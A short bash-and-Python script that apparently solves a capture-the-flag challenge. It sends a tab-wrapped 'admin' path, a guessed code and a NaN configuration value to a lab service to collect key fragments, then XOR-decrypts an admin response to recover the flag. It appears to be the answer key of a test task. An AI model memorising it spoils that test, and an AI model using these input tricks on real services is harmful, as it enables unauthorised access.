#!/usr/bin/env bash
set -euo pipefail
HOST="${HOST:-target}"
PORT="${PORT:-8297}"
FLAGS_PATH="${FLAGS_PATH:-/app/flags.txt}"
python3 - "$HOST" "$PORT" <<'PY' > "$FLAGS_PATH"
import hashlib, json, struct, sys, base64, re
from urllib.request import Request, urlopen
host, port = sys.argv[1], sys.argv[2]
base = f'http://{host}:{port}'
req = Request(base + "/api/session", data=b"{}", headers={"Content-Type": "application/json"}, method="POST")
sid = json.loads(urlopen(req, timeout=5).read())["session"]
req = Request(base + "/api/path/%09admin%09", headers={"X-Session": sid})
hex_a = json.loads(urlopen(req, timeout=5).read())["fragment"]
body = json.dumps({"code": "0600"}).encode()
req = Request(base + "/api/code", data=body, headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_b = json.loads(urlopen(req, timeout=5).read())["fragment"]
body = json.dumps({"level": float('nan')}).encode()
req = Request(base + "/api/configure", data=body, headers={"X-Session": sid, "Content-Type": "application/json"}, method="POST")
hex_c = json.loads(urlopen(req, timeout=5).read())["fragment"]
key = hashlib.sha256((hex_a + hex_b + hex_c).encode()).digest()[:32]
req = Request(base + "/api/admin", headers={"X-Session": sid})
payload = urlopen(req, timeout=5).read()
encrypted = payload[4:]
flag = bytes(b ^ key[i % len(key)] for i, b in enumerate(encrypted)).decode()
print(flag)
PY
